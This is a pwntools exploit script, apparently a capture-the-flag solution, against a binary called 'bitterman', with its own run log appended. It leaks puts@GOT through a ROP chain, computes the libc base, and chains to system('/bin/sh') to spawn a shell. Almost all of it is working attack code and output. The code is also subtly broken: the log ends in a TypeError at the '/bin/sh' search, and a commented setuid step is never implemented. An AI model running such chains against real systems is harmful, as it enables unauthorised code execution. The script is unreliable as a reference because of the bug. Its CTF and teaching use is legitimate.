#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


def local(argv=[], *a, **kw):
    # Execute the target binary locally
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    # Connect to the process on the remote host
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


# Stage 0
# ELF Manipulation. Load the binary and set up pwntools for the correct architecture
log.info("Mapping binaries")
exe = context.binary = ELF('./bitterman')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1234)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

start = local if args.LOCAL else remote

io = start()

# Create a ROP object which looks up symbols in the binary.
rop = ROP(exe)

# Stage 1. Leak the offset
# gadget to leak = pop_rdi + got_puts + plt_puts + plt_main
rop.call(exe.sym.puts, [exe.got.puts])
rop.call(exe.sym.main)
log.info("Stage 1 ROP Chain:\n" + rop.dump())
# Offset to %rsp is 152.
payload = fit({152: rop.chain()})

# Interaction with the program
io.recvuntil("name?")
io.sendline("Daniel")
io.recvuntil("message:")
io.sendline("1024")
io.recvuntil("text:")
io.sendline(payload)
io.recvuntil("Thanks!")
# Leak puts@GOT location.
leaked_puts = u64((io.recv()[:8].strip().ljust(8, b'\x00')))
log.info(f'Leaked puts@GOT: {leaked_puts}')

# Stage 2. Code Execution
# Gadget to code execution "pop_rdi + p64(0) + setuid_loc + pop_rdi + binsh_loc + system_loc"
# The second stage will be shorter because libc.address sets the offset and simplifies the search of *_loc.
libc.address = leaked_puts - libc.sym.puts
log.info(f'PUTS@GLIBC: {libc.sym.puts}')
log.info(f'@GLIBC offset: {libc.address}')

rop2 = ROP(exe)
system = libc.sym.system
log.info(f'system@GLIBC: {hex(system)}')
binsh = next(libc.search("/bin/sh"))
log.info(f'binbash@LIBC: {binsh}')
rop2.call(system, [binsh])
# Print the status of the ROP2 Chain
log.info("Stage 2 ROP Chain:\n" + rop2.dump())
# Create the payload chain.
payload2 = fit({152: rop2.chain()})

# 19. Interaction with the program
io.sendline("Daniel")
io.recvuntil("message:")
io.sendline("1024")
io.recvuntil("text:")
io.sendline(payload2)
io.interactive()
'''
# ./bitterman-300_rop_libcputs_pwnlib.py LOCAL DEBUG
[*] Mapping binaries
[*] '/opt/bitterman-300/bitterman'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/opt/bitterman-300/bitterman': pid 2284
[*] Loaded cached gadgets for './bitterman'
[*] Stage 1 ROP Chain:
    0x0000:         0x400853 pop rdi; ret
    0x0008:         0x600c50 [arg0] rdi = got.puts
    0x0010:         0x40051c
    0x0018:         0x4006ec 0x4006ec()
[*] Leaked puts@GOT: 0x7f02d92ca040
[*] PUTS@GLIBC: 0x7f02d92ca040
[*] @GLIBC offset: 0x7f02d9256000
[*] system@GLIBC: 0x7f02d929cff0
Traceback (most recent call last):
  File "./bitterman-300_rop_libcputs_pwnlib.py", line 81, in <module>
    binsh = next(libc.search("/bin/sh"))
  File "/usr/local/lib/python3.7/dist-packages/pwnlib/elf/elf.py", line 1097, in search
    offset = data.find(needle, offset)
TypeError: argument should be integer or bytes-like object, not 'str'
'''
